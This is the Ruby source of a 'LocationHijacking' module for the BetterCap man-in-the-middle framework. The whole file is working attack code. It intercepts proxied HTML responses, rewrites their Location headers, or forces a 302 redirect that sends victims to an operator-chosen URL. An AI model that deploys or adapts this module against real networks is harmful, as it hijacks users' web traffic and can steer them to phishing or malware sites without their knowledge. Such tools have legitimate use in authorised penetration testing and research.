=begin

BETTERCAP

Author : Francesco 'hex7c0' Carnielli, Nicholas Starke
Email  : hex7c0@gmail.com, nick@alephvoid.com

This project is released under the GPL 3 license.

=end

class LocationHijacking < BetterCap::Proxy::Module
  @@location = nil

  def self.on_options(opts)
    opts.separator ""
    opts.separator "Location Hijacking Module Options:"
    opts.separator ""

    opts.on( '--location STRING', 'Location to redirect to (with preceding protocol)' ) do |v|
      @@location = v.strip
    end
  end

  def initialize
    raise BetterCap::Error, "No --location option specified for the proxy module." if @@location.nil?
  end

  def on_request( request, response )
    # is it a html page?
    if response.content_type =~ /^text\/html.*/
      found = false
      for h in response.headers
        # prevent Request loop
        if h.include?("Location:")
          found = true
          if !h.include?(@@location)
            BetterCap::Logger.info "Hijacking http://#{request.host}#{request.url} request to #{@@location}."
            h.replace("Location: #{@@location}")
          end
        end
      end
      BetterCap::Logger.info request.url
      BetterCap::Logger.info request.host
      if !found && !@@location.include?(request.host)
        BetterCap::Logger.info "No Location header found, adding one now for #{@@location}"
        # Replace HTTP Response code with 302
        response.headers.first.sub!(/\d{3}/, '302')
        # This is an ugly hack to get around github issue #117
        response.headers.reject! { |header| header.empty? }
        # This is our payload line that is fine
        response.headers << "Location: #{@@location}"
        # This line is also necessary because of github issue #117
        response.headers << ""
      end
    end
  end
end
